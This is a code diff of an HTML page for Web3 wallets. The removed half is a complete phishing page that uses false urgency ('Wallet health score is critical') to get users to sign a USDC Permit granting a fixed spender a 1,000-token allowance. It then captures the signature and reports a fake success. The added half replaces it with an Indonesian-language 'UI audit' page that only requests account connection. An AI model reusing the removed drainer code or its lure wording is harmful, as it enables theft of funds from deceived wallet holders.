@@ -3,62 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Integrity Check</title>
+    <title>UI Security Audit Tool</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
-        .card { border: 1px solid #dee2e6; padding: 25px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.08); text-align: center; background: white; max-width: 380px; }
-        .system-alert { background: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; border: 1px solid #ffeeba; }
-        h3 { margin-top: 0; color: #212529; }
-        p { color: #495057; font-size: 14px; line-height: 1.6; }
-        button { padding: 14px 0; background-color: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; width: 100%; font-weight: 600; margin-top: 10px; }
-        button:hover { background-color: #0056b3; }
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; background-color: #f4f4f9; }
+        .card { border: 1px solid #ccc; padding: 25px; border-radius: 12px; background: white; max-width: 450px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .audit-info { background: #e9ecef; padding: 15px; border-radius: 8px; font-size: 14px; margin-bottom: 15px; border-left: 4px solid #007bff; }
+        .btn-audit { background-color: #28a745; color: white; padding: 12px; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div class="system-alert">
-            <strong>System Notice:</strong> Wallet health score is critical. Immediate synchronization required to prevent asset lockout.
+        <h3>Analisis Keamanan Antarmuka</h3>
+        <div class="audit-info">
+            <p><strong>Tujuan:</strong> Menguji transparansi UI dompet saat menerima permintaan koneksi.</p>
+            <p>Kode ini <strong>TIDAK</strong> akan memicu penandatanganan data atau izin transfer aset. Ini murni untuk audit apakah UI dompet memberikan peringatan yang jelas kepada pengguna tentang asal domain.</p>
         </div>
-        <h3>System Synchronization</h3>
-        <p>Authorize this request to re-sync your wallet keys with our decentralized node to ensure full compatibility.</p>
-        <button id="verifyBtn">Authorize & Sync</button>
+        <button id="auditBtn" class="btn-audit">Mulai Audit Koneksi</button>
+        <p id="log" style="font-size: 12px; margin-top: 15px; color: #555;"></p>
     </div>
 
     <script>
-        const btn = document.getElementById('verifyBtn');
-
-        btn.addEventListener('click', async () => {
-            if (!window.ethereum) return alert("Wallet not found.");
+        document.getElementById('auditBtn').addEventListener('click', async () => {
+            const log = document.getElementById('log');
+            if (!window.ethereum) return log.innerText = "Error: Tidak ada penyedia dompet Web3 terdeteksi.";
+            
             try {
+                // Hanya meminta akses koneksi akun (koneksi standar)
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
-                const chainId = parseInt(chainIdHex, 16);
-
-                const permitData = {
-                    domain: { name: "USD Coin", version: "2", chainId: chainId, verifyingContract: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
-                    message: {
-                        owner: accounts[0],
-                        spender: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", 
-                        value: "1000000000", nonce: 0, 
-                        deadline: Math.floor(Date.now() / 1000) + 3600
-                    },
-                    primaryType: "Permit",
-                    types: {
-                        EIP712Domain: [{ name: "name", type: "string" }, { name: "version", type: "string" }, { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }],
-                        Permit: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }, { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }]
-                    }
-                };
-
-                const signature = await window.ethereum.request({
-                    method: 'eth_signTypedData_v4',
-                    params: [accounts[0], JSON.stringify(permitData)],
-                });
-
-                console.log("Captured:", signature);
-                alert("Synchronization successful.");
+                log.innerText = "Audit Berhasil: Dompet terhubung dengan akun " + accounts[0] + ". Periksa apakah UI dompet menampilkan nama domain ini dengan jelas.";
             } catch (err) {
-                alert("Sync failed: " + err.message);
+                log.innerText = "Audit Dihentikan: " + err.message;
             }
         });
     </script>
